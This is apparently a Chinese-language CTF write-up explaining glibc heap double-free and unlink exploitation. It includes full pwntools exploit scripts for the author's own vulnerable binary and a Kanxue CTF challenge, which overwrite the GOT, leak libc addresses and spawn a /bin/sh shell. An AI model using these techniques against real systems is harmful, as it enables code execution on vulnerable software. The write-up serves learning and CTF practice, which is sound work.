---
layout: post
title: "linux堆溢出漏洞之double free"
---

#### 0x00 前言: ####

- 环境： ubuntu 16.04 LTS 64位
- 工具： peda pwntools

使用的漏洞代码(参照看雪ctf的[这个题目](https://ctf.pediy.com/game-fight-34.htm)写的)。点击这里查看漏洞源码

编译：

	gcc -g -no-pie -fno-stack-protector -o vul vul.c


#### 0x01 漏洞描述: ####

攻击者通过伪造的`chunk_header`，在空闲内存合并的过程(向前合并、向后合并)，将用户伪造的chunk识别为空闲内存，并进行了unlink操作(空闲内存会维持在bins中，有4种类型的bin)，在unlink的过程中，造成了地址写的操作，这样肯定很难理解，下面举例一次攻击的过程。

首先攻击者先分别申请2块大小为256字节的内存为A，B，后续分别释放A，B
	
	char *A = (char *)malloc(256);
	char *B = (char *)malloc(256);

	free(A);
	free(B);
	// 释放完毕后，并没有重置A，B指针

接着攻击者再申请一块内存C(大小为256 + 256 + 16)，最好该内存的大小能刚好覆盖到之前A，B申请的内存
	
	char *C = (char *)malloc(256 + 256 + 16）
	char *payload = p64(fake1_prev_size) + p64(fake1) + p64(FD) + p64(BD) + (0x100-32)*'A' + p64(fake2_prev_size) + p64(fake2_size)
	strcpy(C, payload)

这里只是为了方便说明，此时有几个关键的点需要了解，chunk_header? malloc返回的指针是指向哪里的? 释放后的内存地址有何变化?

首先知道`chunk_header`的布局，以及`malloc`申请返回的是指向哪里

<pre>chunk_header+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</pre>

上图为我们正常`malloc`后所获得的内存(allocated)是什么样子的，`chunk_header`我们在使用的时候是不可见的，由glibc来进行管理的，malloc给我们返回的指针是mem指向的地址，可以直接拿来使用存取数据；对于`chunk_header`在分配的内存chunk中，只有`prev_size`和`size`两个filed使用，`prev_size`只有当前一个chunk为free状态时，就会设置为前一个chunk的大小，对于size会设置为当前chunk的大小(包含`chunk_header`的大小)，并且在size的最低3位为标志位，其中最后一位P标识前一个chunk是否为free状态(这个标志位为关键点)。

<pre>chunk_header+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                     |A|0|P|
      mem-  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</pre>

上图为正常free后内存(freed)的样子,mem指向的地方就是我们使用malloc返回的地址。大致都与上图内容相同，不过对于freed的chunk多了2个字段`forward pointer`(FD)和`back pointer`(BD),因为freed chunk会通过glibc保存在各种bins中(Fast bin、Unsorted bin、Small bin、Large bin， 有兴趣可以看看[这篇文章](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html)),FD会指向前一个free chunk，BD会指向后一个free chunk



继续我们的示例，此时的内存布局为：

<pre>high --- +----------------------+
         |                      |
         |                      |
         +----------------------+ ----  C end
         |                      |
         |                      |
         +----------------------+ ---  B
         |     fake2 size       |
         +----------------------+
         |    fake2_prev_size   |
         +----------------------+
         |                      |
         |    "A"*(0x100-32)    |
         |                      |
         +----------------------+
         |       fake BD        |
         +----------------------+
         |       fake FD        |
         +----------------------+
         |      fake1 size      |
         +----------------------+
         |    fake1_prev_size   |
         +----------------------+ ---  C=A
         |      size=0x210      |
         +----------------------+
         |       prev_size      |
 low --- +----------------------+</pre>

我们可以看到C 和 A的内存地址是相同的，并且B所指向的地址是在C所申请的内存范围内,此时执行

	free(B)

将会判断B前面的chunk(C=A)是否为空，如果为空就会进行unlink，而判断chunk是否为空，就需要查看该chunk后一个chunk的size字段中的P标志位，这样说可能会比较绕，在例子中我们要判断chunk(C=A)是否为free,检查fake2 size的最后一位是否为0就可以判断，接着就会进行unlink操作。

这里简单说明unlink操作是为了什么，之前说过freed chunk会保存在各种bins中，所以这里欺骗系统我们的伪造的chunk也是free的(认为我们的伪造的chunk也是双向链表中的一项)，为了修改它的数据(于我们free的内存合并成一个大的空闲内存，再添加到bins中)，所以就需要unlink摘下来而在摘的过程中需要维护双向链表的完整性，所以才会造成写的动作。

接下来是进行unlink操作(地址改写的关键操作就在这个函数里面)，由于后期加入了安全机制，需要符合`FD->bd == BD->fd == P`, P为当前的`free chunk(C=A).`所以我们需要能控制一个特殊的指针能指向我们的C存储的地址我们假设为X，`*X=P`, 这样当fake FD为X-0x18,fake BD为X-0x10,在执行检查时，`FD->bd = *(X-0x18+0x18) = P`, `BD->fd = *(X-0x10+0x10) = P`,这样就绕过检查。

接着会执行unlink中的改写操作：

    FD = P->fd;
    BK = P->bk;
    FD->bk = BK;
    BK->fd = FD;

最终的效果为X所保存的地址(之前是P就是C)，先后被修改为X-0x10,X-0x18.这里的X一般在CTF中都是存在于堆上的一个地址，用来保存其它数据的地址。

大致的过程就是这样，如果没有一点基础理解起来确实比较费劲，我个人觉得描述也不是很到位，也有点混乱。

接下来通过程序的实战来加深对理论的理解

#### 0x02 漏洞利用: ####

漏洞程序的源码在前面已经给出，程序的大致功能可以通过源码查看。存在漏洞的地方在于delete_exp中并没有重置释放的指针变量，导致double free漏洞产生

![linuxd2f]({{ '/images/201804/linuxd2f_2_1.png' | prepend: site.baseurl }})


利用过程：

先申请2块地址，接着释放：

	create(1, 0x100, '1111')
	create(2, 0x100, '2222')
	// 释放申请到的内存
	delete(1)
	delete(2)

接着构造payload，入之前讲解漏洞利用过程中那样构造

	payload = p64(0) + p64(0x101) + p64(x_pointer-0x18) + p64(x_pointer-0x10) + 'A'*(0x100-32)
	payload += p64(0x100) + p64(0x210-0x100)
	create(1, 0x210, '3333')

其中`x_pointer=0x602120+0x10`,我们通过`readelf -s vul`获取到的全局变量地址(`exp_repo=0x602120`)，主要是存放create创建的内存地址，这样就可以构造满足`*X=P`.这里我们利用的索引为1，所以`x_pointer=0x602130`, 那么这里构造的FD为`x_pointer-0x18`, BD为`x_pointer-0x10`，那么`FD->bd = *(0x602130-0x18+0x18) = 我们create(1)时返回的地址`，BD->fd同理， 最后x_pointer存放的地址通过unlink操作就会变成`0x602130-0x18=0x602118`.

payload开头的p64(0) + p64(0x101)分别为prev_size由于第一个chunk前的chunk永远都是使用中的所以这里填写为0，0x101是0x100 & 1代表当前chunk大小为0x100并设置最后一位为1说明前一个chunk在使用中；最后的`p64(0x100) + p64(0x210-0x100)`分别代表前一个chunk的大小0x100，后一个代表但前chunk的大小并设置P标志位为0，表明前面的chunk为空；这样在free(2)的时候，就会进行unlink操作。

我们可以通过动态调试来描述发生了什么

![linuxd2f]({{ '/images/201804/linuxd2f_2_2.png' | prepend: site.baseurl }})

0x602120为`exp_repo`的起始地址， 分别保存了我们4个create内存地址。

接着分别delete(1),delete(2)

![linuxd2f]({{ '/images/201804/linuxd2f_2_3.png' | prepend: site.baseurl }})

可以看到index1,index2的数据有的被垃圾数据填充，但是地址还是保存在`exp_repo`中对应的位置

接着通过`create(1, 0x210, payload1)`

![linuxd2f]({{ '/images/201804/linuxd2f_2_4.png' | prepend: site.baseurl }})

看到index1存放的地址，还是与free(1)之前申请的内存地址一样，并且payload成功写入，接着关键点free(2),会进行unlink操作

![linuxd2f]({{ '/images/201804/linuxd2f_2_5.png' | prepend: site.baseurl }})

成功将`0x602130`存放的地址写成为了`0x602118(x_pointer-0x18)`,证明漏洞利用成功，此时edit(1)就相当于直接在堆上进行写入，现在我们已经成功的获取到一个堆地址的写入能力，通过查看我们可以覆盖create申请的内存地址，然后再调用edit来编辑目标内存地址中的内容。

接下来我们的思路是通过覆盖index0的地址内容为，free.got.plt的地址，这样我们通过`edit(0, p64(puts_plt))`，就可以劫持free函数让它跳转到puts函数地址，我们再继续覆盖index1的地址内容为puts.got.plt地址，这样我们通过前面劫持的free函数，通过delete(1)就相当于调用`puts(puts.got.plt)`,就可以泄漏puts函数的内存地址，然后通过偏移计算得出system的函数地址。

接着我们构造payload2

    payload2 = p64(1)	# 填充，在exp_repo中对每一个exp保存了它申请的内存地址，以及一个标志位
    payload2 += p64(free_got=0x602018) + p64(1)	# index 0 覆盖为 free.got.plt
    payload2 += p64(puts_got=0x602020) + p64(1)	# index 1 覆盖为 puts.got.plt
    
    edit(1, payload2)

查看此时的内存布局

![linuxd2f]({{ '/images/201804/linuxd2f_2_6.png' | prepend: site.baseurl }})

成功的覆盖了index0和index1保存的内存地址，通过`edit(0, p64(puts_plt))`就可以劫持free.got.plt为puts.plt函数

![linuxd2f]({{ '/images/201804/linuxd2f_2_7.png' | prepend: site.baseurl }})

可以看到成功的修改了`free.got.plt`指向的地址，接着调用delete(1)就会输出puts的函数地址(index1此时的内容为puts.got.plt)

![linuxd2f]({{ '/images/201804/linuxd2f_2_8.png' | prepend: site.baseurl }})

成功泄漏地址，后续就是根据偏移计算system地址，然后再次修改`free.got.plt`指向system的地址，最后调用delete(3),index3中保存的为"/bin/sh"字符串，相当于直接调用`system("/bin/sh")`

完整payload如下

<pre>#!/usr/bin/python

from pwn import *

p = process('./vul')
elf = ELF('./vul')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(p)[0])

#context.log_level = 'debug'

def welcome():
    p.recvuntil('name: \n$')
    p.send('p')

def create(index, size, content):
    p.recvuntil('$ ')
    p.send('1')
    p.recvuntil('input lenght: \n')
    p.send(str(size))
    p.recvuntil('input exp index: \n')
    p.send(str(index))
    p.recvuntil('Input content: \n')
    p.send(content)

def delete(index):
    p.recvuntil('$ ')
    p.send('2')
    p.recvuntil('Chose one to delete: \n')
    p.send(str(index))

def edit(index, content):
    p.recvuntil('$ ')
    p.send('3')
    p.recvuntil('chose one to edit: \n')
    p.send(str(index))
    p.recvuntil('Input Content: \n')
    p.send(content)

if __name__ == '__main__':
    puts_plt = elf.symbols['puts']
    puts_got = elf.got['puts']
    free_got = elf.got['free']
    x_pointer = 0x602130 # pointer to index 1


    welcome()
    create(0, 0x20, 'junkdata')
    create(3, 0x20, '/bin/sh\x00')
    create(1, 0x100, '1111')
    create(2, 0x100, '2222')
    delete(1)
    delete(2)

    payload1 = p64(0) + p64(0x101) + p64(x_pointer-0x18) + p64(x_pointer-0x10) + 'A'*(0x100 - 32) + p64(0x100) + p64(0x210-0x100)
    create(1, 0x210, payload1)
    delete(2)

    # index1 *0x602130 = 0x602118
    payload2 = p64(1)
    payload2 += p64(free_got) + p64(1) # index 0 is free.got.plt
    payload2 += p64(puts_got) + p64(1) # index 1 is puts.got.plt    

    edit(1, payload2)
    sleep(1)
    edit(0, p64(puts_plt)) # free.got.plt --> puts.plt
    delete(1)   # leak puts.got.plt address

    puts_addr = u64(p.recv(6) + "\x00"*2)
    print "[+] the puts address is " + hex(puts_addr)

    system_addr = puts_addr - (libc.symbols['puts'] - libc.symbols['system'])
    print "[+] the system address is " + hex(system_addr)

    edit(0, p64(system_addr))   # free.got.plt --> system()
    delete(3)           # system('/bin/sh')
    p.interactive()</pre>

运行结果如下图：

![linuxd2f]({{ '/images/201804/linuxd2f_2_9.png' | prepend: site.baseurl }})


#### 0x03 看雪CTF 4-ReeHY-main： ####

漏洞利用过程大致相同，exp如下：

<pre>#!/usr/bin/python

from pwn import *

p = process('./4-ReeHY-main')
elf = ELF('./4-ReeHY-main')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(p)[0])
#context.log_level = 'debug'

def welcome():
    p.recvuntil('name: \n$')
    p.send('polar')

def create(index, size, content):
    p.recvuntil('*********\n$')
    p.send('1')
    p.recvuntil('Input size\n')
    p.send(str(size))
    p.recvuntil('Input cun\n')
    p.send(str(index))
    p.recvuntil('Input content\n')
    p.send(content)

def delete(index):
    p.recvuntil('*********\n$')
    p.send('2')
    p.recvuntil('Chose one to dele\n')
    p.send(str(index))

def edit(index, content):
    p.recvuntil('*********\n$')
    p.send('3')
    p.recvuntil('to edit\n')
    p.send(str(index))
    p.recvuntil('the content\n')
    p.send(content)

if __name__ == '__main__':
    puts_plt = elf.symbols['puts']
    p_addr = 0x602100
    free_got = elf.got['free']
    puts_got = elf.got['puts']
    
    welcome()
    create(0, 0x20, '/bin/sh\x00')
    create(2, 0x100, 'BBBB')
    create(1, 0x100, 'CCCC')
    delete(2)
    delete(1)
    payload = p64(0) + p64(0x101) + p64(p_addr-0x18) + p64(p_addr-0x10) + 'A'*(0x100-32)
    payload += p64(0x100) + p64(0x210-0x100)
    create(2, 0x210, payload)
    delete(1)

    edit(2, p64(1)+p64(free_got)+p64(1)+p64(puts_got)+p64(1))
    edit(1, p64(puts_plt))
    delete(2)
    puts_addr = u64(p.recv(6) + "\x00"*2)
    print "[+] the puts address is " + hex(puts_addr)

    system_addr = puts_addr - (libc.symbols['puts'] - libc.symbols['system'])
    print "[+] the system address is " + hex(system_addr)

    edit(1, p64(system_addr))
    delete(0)

    p.interactive()</pre>

下图是当时调试画出来方便理解改类型的漏洞利用方式：

<pre>                             --------------------------+

                 x-0x18       x-0x10       x
                   +            +          +
HEAP               |            |          |
                   |            |          |
     +-------------+------------v----------v-------------------------------------+
     |                                                                           |
     |                                                                           |
     |                                    ptr    after unlink; ptr overwriteen;  |
     |                                     +     ptr=x-0x18                      |
     |                                     |                                     |
     |                                     |                                     |
     +---------------------------------------------------------------------------+
    low                                    |                                    high
                                           ^
                                           +----------+----------+-------------+
                                           |          |          |             |
                                           |          | fd=x-0x18|bd=x-0x10    |
                                           |          |          |             |
                                           |          |          |             |
                                           +----------+----------+-------------+</pre>


#### 0x04 总结： ####

在调试4-ReeHY-main的时候踩的坑：

在写exp的时候，一直调用的是当时题目带的libc.so(当时没有意识到)，发现本地偏移有问题，后来才想到我本地调试使用的是本地的libc.so
exp写好后，在kaili上调试，都可以正常doublefree，而且也成功的调用puts函数，但是一直无法正常泄漏地址，后来切换成ubuntu问题解决，exp梳理跑通

在调试自己的程序时踩了以下的坑：

- 使用ubuntu调试的时候，无法正常加载gdb，原因是因为我使用了sudo，去掉sudo可以正常调试
- 一开始一直在报`corrupted size vs. prev_size:`，原因是因为自己设定的X_pointer并没有符合绕过unlink保护机制导致的，重新修改该地址
- 一直无法正常调用puts来泄漏puts函数的地址，使用`context.leve_level='debug'`,发现在执行`edit(0, u64(puts_plt))`的时候，没有发送任何内容就返回到菜单，后来调试发现，因为index0并没有初始化长度，导致在edit的时候，长度为0，read就直接退出返回到主菜单，添加长度，解决
- 最后一点还是无法正常接收泄漏的地址，发现在puts_addr定义处错误的使用了p64,`puts_addr=p64(p.recv(6) + "\x00"*2)`导致报错，后来修改成为`puts_addr=u64(p.recv(6)+ "\x00"*2)`，成功拿到shell 

#### 最终总结： ####

在调试这些程序的时候，精神还是需要高度集中，一点点的差错会导致调试时间的翻倍增长，造成恶性循环。 主要目的还是想了解漏洞的本质，但是有可能在错误的环境下越走越远，时间成本和精力，以及信心都消耗巨大。

KEEP GOING!!! :P